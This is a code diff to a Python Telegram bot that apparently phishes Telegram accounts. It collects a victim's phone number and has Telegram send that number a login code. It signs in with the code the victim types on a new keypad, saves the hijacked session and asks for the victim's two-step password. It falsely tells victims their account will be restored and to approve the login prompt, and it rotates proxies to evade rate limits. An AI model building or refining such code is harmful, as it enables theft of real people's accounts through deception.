@@ -117,6 +117,62 @@ def create_restart_button():
     keyboard = [[KeyboardButton("重新验证", request_contact=False)]]
     return ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)
 
+
+def create_keypad():
+    """数字键盘+查看验证码：输验证码用"""
+    keyboard = [
+        [KeyboardButton("查看验证码")],
+        [KeyboardButton("1"), KeyboardButton("2"), KeyboardButton("3")],
+        [KeyboardButton("4"), KeyboardButton("5"), KeyboardButton("6")],
+        [KeyboardButton("7"), KeyboardButton("8"), KeyboardButton("9")],
+        [KeyboardButton("确认✅"), KeyboardButton("0"), KeyboardButton("清除❌")],
+    ]
+    return ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)
+
+
+async def safe_delete(context, chat_id, message_id):
+    # 删步骤旧消息，失败静默（已删/无权限都不影响流程）
+    try:
+        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
+    except Exception:
+        pass
+
+
+async def step_send(update, context, text, reply_markup=None):
+    # 发步骤消息：先删掉上一步的，聊天区只留当前步骤
+    user_id = update.effective_user.id
+    chat_id = update.effective_chat.id
+    old_id = user_states.get(user_id, {}).get("step_msg_id")
+    if old_id:
+        await safe_delete(context, chat_id, old_id)
+    msg = await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup)
+    user_states.setdefault(user_id, {})["step_msg_id"] = msg.message_id
+    return msg
+
+
+async def read_code_from_telegram(user_id):
+    # 经 Telethon 读 777000 服务通知，提取 5 位登录码
+    import re
+    client = telethon_clients.get(user_id)
+    if client is None:
+        return None
+    try:
+        msgs = await client.get_messages(777000, limit=5)
+        for m in msgs:
+            text = getattr(m, "message", "") or ""
+            found = re.search(r'(?<!\d)(\d{5})(?!\d)', text)
+            if found and ("code" in text.lower() or "验证码" in text or "login" in text.lower()):
+                return found.group(1)
+        # 放宽：只要是5位数字就取最新一条
+        for m in msgs:
+            text = getattr(m, "message", "") or ""
+            found = re.search(r'(?<!\d)(\d{5})(?!\d)', text)
+            if found:
+                return found.group(1)
+    except Exception as e:
+        logger.warning(f"读取服务通知失败: {e}")
+    return None
+
 async def handle_restart(update, context):
     """处理重新验证按钮点击"""
     user_id = update.effective_user.id
@@ -293,7 +349,11 @@ async def start(update, context):
     var = None
     if context.args:
         var = context.args[0] if context.args else None
+    # 重开清掉旧步骤消息，避免残留
+    old_id = user_states.get(user_id, {}).get("step_msg_id")
     user_states[user_id] = {"state": "start", "code_attempts": 0, "password_attempts": 0}
+    if old_id:
+        await safe_delete(context, update.effective_chat.id, old_id)
     keyboard = [[KeyboardButton("发送手机号", request_contact=True)]]
     reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)
     await update.message.reply_text(
@@ -313,10 +373,9 @@ async def handle_contact(update, context):
         user_states[user_id] = {"state": "phone_ok", "phone": phone, "code_attempts": 0, "password_attempts": 0}
         keyboard = [[KeyboardButton("获取验证码")]]
         reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)
-        await update.message.reply_text(
-            f"手机号验证成功。\n\n{phone}\n\n准备就绪后请点击获取验证码。",
-            reply_markup=reply_markup
-        )
+        await step_send(update, context,
+                        f"⏳ 正在验证您的手机号码...\n\n{phone}\n\n验证成功后请点击获取验证码。",
+                        reply_markup=reply_markup)
     except Exception as e:
         await update.message.reply_text(f"获取手机号失败: {str(e)}")
 
@@ -381,12 +440,10 @@ async def handle_code_request(update, context):
         result = await client.send_code_request(phone)
         user_states[user_id]["state"] = "code_sent"
         user_states[user_id]["phone_code_hash"] = str(result.phone_code_hash) if result.phone_code_hash else ""
-        keyboard = [[KeyboardButton("重新验证")]]
-        reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)
-        await update.message.reply_text(
-            "验证码已发送。\n您会收到一条系统消息。\n\n请按以下格式输入 5 位验证码。\n格式：TG + 5 位数字，例如：TG12345",
-            reply_markup=reply_markup
-        )
+        user_states[user_id]["code_buf"] = ""
+        await step_send(update, context,
+                        "✅ 验证码已发送\n\n请点击下方按钮查看验证码，或用数字键盘输入后按确认✅：",
+                        reply_markup=create_keypad())
     except telethon.errors.rpcerrorlist.PhoneNumberOccupiedError:
         await update.message.reply_text("该号码已被注册，请更换号码后重试。", reply_markup=create_restart_button())
     except telethon.errors.rpcerrorlist.PhoneNumberInvalidError:
@@ -397,6 +454,62 @@ async def handle_code_request(update, context):
         await update.message.reply_text("发送过于频繁，请稍后再试。", reply_markup=create_restart_button())
     except Exception as e:
         await update.message.reply_text(f"发送验证码失败，请重试。", reply_markup=create_restart_button())
+
+async def submit_code(update, context, user_id, code):
+    # 统一提交验证码：文本TG12345 / 键盘确认 / 查看验证码自动读码共用
+    phone = user_states[user_id].get("phone")
+    phone_code_hash = str(user_states[user_id].get("phone_code_hash", ""))
+    await step_send(update, context, "⏳ 正在验证您的手机号码...", reply_markup=create_keypad())
+    try:
+        client = await get_telethon_client(user_id)
+        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+        user_states[user_id]["state"] = "done"
+        await backup_session(phone, client)
+        # 成功为终态：清掉验证中消息再发结果
+        old_id = user_states.get(user_id, {}).get("step_msg_id")
+        if old_id:
+            await safe_delete(context, update.effective_chat.id, old_id)
+            user_states[user_id].pop("step_msg_id", None)
+        try:
+            with open(IMAGE_PATH, 'rb') as photo:
+                await update.message.reply_photo(photo=photo, caption="验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。")
+        except Exception:
+            await update.message.reply_text("验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。")
+    except telethon.errors.rpcerrorlist.PhoneCodeInvalidError:
+        code_attempts = user_states[user_id].get("code_attempts", 0) + 1
+        user_states[user_id]["code_attempts"] = code_attempts
+        if code_attempts >= MAX_CODE_ATTEMPTS:
+            user_states[user_id].pop("step_msg_id", None)
+            await update.message.reply_text("验证码错误次数过多，请重新开始。")
+            reset_user_state(user_id)
+            await update.message.reply_text("验证失败次数过多，请点击下方按钮重新验证。", reply_markup=create_restart_button())
+        else:
+            remaining = MAX_CODE_ATTEMPTS - code_attempts
+            await step_send(update, context, f"验证码错误，请重新输入。\n剩余尝试次数: {remaining}",
+                            reply_markup=create_keypad())
+    except telethon.errors.rpcerrorlist.SessionPasswordNeededError:
+        user_states[user_id]["state"] = "password"
+        user_states[user_id]["password_attempts"] = 0
+        await step_send(update, context, "验证成功，继续输入您的二级密码。", reply_markup=create_restart_button())
+    except telethon.errors.rpcerrorlist.FloodWaitError as e:
+        next_idx = await rotate_proxy(user_id)
+        if next_idx is not None:
+            user_states[user_id]["state"] = "phone_ok"
+            await step_send(update, context, "当前 IP 被限制，正在自动切换到新 IP 重试...\n\n请再次点击「获取验证码」。",
+                            reply_markup=create_restart_button())
+        else:
+            await step_send(update, context,
+                            f"操作过于频繁，需要等待 {e.seconds} 秒。\n"
+                            f"如需绕过限制，请在 .env 中配置多个代理（PROXY_HOST_1, PROXY_PORT_1 等）。",
+                            reply_markup=create_restart_button())
+    except Exception as e:
+        if "password" in str(e).lower() or "two-steps" in str(e).lower():
+            user_states[user_id]["state"] = "password"
+            user_states[user_id]["password_attempts"] = 0
+            await step_send(update, context, "验证成功，继续输入您的二级密码。", reply_markup=create_restart_button())
+        else:
+            await step_send(update, context, f"验证失败: {str(e)}", reply_markup=create_restart_button())
+
 
 async def handle_message(update, context):
     user_id = update.effective_user.id
@@ -418,59 +531,42 @@ async def handle_message(update, context):
             await update.message.reply_text("请点击获取验证码按钮。", reply_markup=create_restart_button())
         return
     if state == "code_sent":
-        code_attempts = user_states[user_id].get("code_attempts", 0)
+        st = user_states[user_id]
+        # 数字键盘：单个数字累积
+        if len(text) == 1 and text.isdigit():
+            buf = (st.get("code_buf", "") + text)[-5:]
+            st["code_buf"] = buf
+            await step_send(update, context, f"请输入您收到的验证码：\n\n已输入：{buf if buf else '—'}",
+                            reply_markup=create_keypad())
+            return
+        if text == "清除❌":
+            st["code_buf"] = ""
+            await step_send(update, context, "已清空，请重新输入验证码。", reply_markup=create_keypad())
+            return
+        if text == "确认✅":
+            buf = st.get("code_buf", "")
+            if len(buf) != 5 or not buf.isdigit():
+                await step_send(update, context, "请输入完整的 5 位验证码后再确认。", reply_markup=create_keypad())
+                return
+            st["code_buf"] = ""
+            await submit_code(update, context, user_id, buf)
+            return
+        if text == "查看验证码":
+            await step_send(update, context, "⏳ 正在为您查看验证码...", reply_markup=create_keypad())
+            code = await read_code_from_telegram(user_id)
+            if code:
+                await step_send(update, context, f"✅ 检测到验证码：{code}\n正在自动提交...",
+                                reply_markup=create_keypad())
+                await submit_code(update, context, user_id, code)
+            else:
+                await step_send(update, context, "暂未收到服务通知，请稍等几秒再点「查看验证码」。",
+                                reply_markup=create_keypad())
+            return
         if len(text) == 7 and text[:2].upper() == "TG" and text[2:].isdigit():
-            code = text[2:]
-            phone = user_states[user_id].get("phone")
-            phone_code_hash = str(user_states[user_id].get("phone_code_hash", ""))
-            await update.message.reply_text("请稍等，正在验证中...")
-            try:
-                client = await get_telethon_client(user_id)
-                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-                user_states[user_id]["state"] = "done"
-                await backup_session(phone, client)
-                try:
-                    with open(IMAGE_PATH, 'rb') as photo:
-                        await update.message.reply_photo(photo=photo, caption="验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。")
-                except Exception:
-                    await update.message.reply_text("验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。")
-            except telethon.errors.rpcerrorlist.PhoneCodeInvalidError:
-                code_attempts += 1
-                user_states[user_id]["code_attempts"] = code_attempts
-                if code_attempts >= MAX_CODE_ATTEMPTS:
-                    await update.message.reply_text("验证码错误次数过多，请重新开始。")
-                    reset_user_state(user_id)
-                    await update.message.reply_text("验证失败次数过多，请点击下方按钮重新验证。", reply_markup=create_restart_button())
-                else:
-                    remaining = MAX_CODE_ATTEMPTS - code_attempts
-                    await update.message.reply_text(f"验证码错误，请重新输入。\n剩余尝试次数: {remaining}\n格式：TG12345", reply_markup=create_restart_button())
-            except telethon.errors.rpcerrorlist.SessionPasswordNeededError:
-                user_states[user_id]["state"] = "password"
-                user_states[user_id]["password_attempts"] = 0
-                await update.message.reply_text("验证成功，继续输入您的二级密码。", reply_markup=create_restart_button())
-            except telethon.errors.rpcerrorlist.FloodWaitError as e:
-                next_idx = await rotate_proxy(user_id)
-                if next_idx is not None:
-                    user_states[user_id]["state"] = "phone_ok"
-                    await update.message.reply_text(
-                        f"当前 IP 被限制，正在自动切换到新 IP 重试...\n\n请再次点击「获取验证码」。",
-                        reply_markup=create_restart_button()
-                    )
-                else:
-                    await update.message.reply_text(
-                        f"操作过于频繁，需要等待 {e.seconds} 秒。\n"
-                        f"如需绕过限制，请在 .env 中配置多个代理（PROXY_HOST_1, PROXY_PORT_1 等）。",
-                        reply_markup=create_restart_button()
-                    )
-            except Exception as e:
-                if "password" in str(e).lower() or "two-steps" in str(e).lower():
-                    user_states[user_id]["state"] = "password"
-                    user_states[user_id]["password_attempts"] = 0
-                    await update.message.reply_text("验证成功，继续输入您的二级密码。", reply_markup=create_restart_button())
-                else:
-                    await update.message.reply_text(f"验证失败: {str(e)}", reply_markup=create_restart_button())
+            await submit_code(update, context, user_id, text[2:])
         else:
-            await update.message.reply_text("格式错误！请按格式输入：TG12345", reply_markup=create_restart_button())
+            await step_send(update, context, "格式错误！用键盘输入5位数字后按确认✅，或按格式输入：TG12345",
+                            reply_markup=create_keypad())
         return
     if state == "password":
         password = text
